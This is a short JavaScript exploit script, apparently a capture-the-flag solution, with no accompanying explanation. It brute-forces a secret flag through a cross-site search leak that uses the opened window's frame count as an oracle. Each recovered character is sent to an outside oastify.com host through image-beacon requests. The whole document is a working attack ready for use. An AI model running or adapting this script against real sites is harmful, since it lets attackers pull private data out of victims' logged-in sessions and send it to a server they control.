<script>
const BASE = "https://wonder.cbd2026.cloud";
const EXFIL = "http://2ilrugk8uo70fnida8a4fpqttkzbn8bx.oastify.com";

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!@#$%^&*().,:;";
let flag = "CBC{";

function leak(s) {
  new Image().src = EXFIL + "/?f=" + encodeURIComponent(s) + "&t=" + Date.now();
}

async function test(prefix) {
  let w = open(BASE + "/search?q=" + encodeURIComponent(prefix), "_blank");
  await new Promise(r => setTimeout(r, 900));

  let ok = false;
  try { ok = w.length > 0; } catch(e) {}
  try { w.close(); } catch(e) {}

  return ok;
}

async function run() {
  leak("START:" + flag);

  while (true) {
    let found = false;

    for (let c of charset) {
      if (await test(flag + c)) {
        flag += c;
        leak(flag);
        found = true;

        if (c === "}") {
          leak("DONE:" + flag);
          return;
        }

        break;
      }
    }

    if (!found) {
      leak("STUCK:" + flag);
      return;
    }
  }
}

run();
</script>
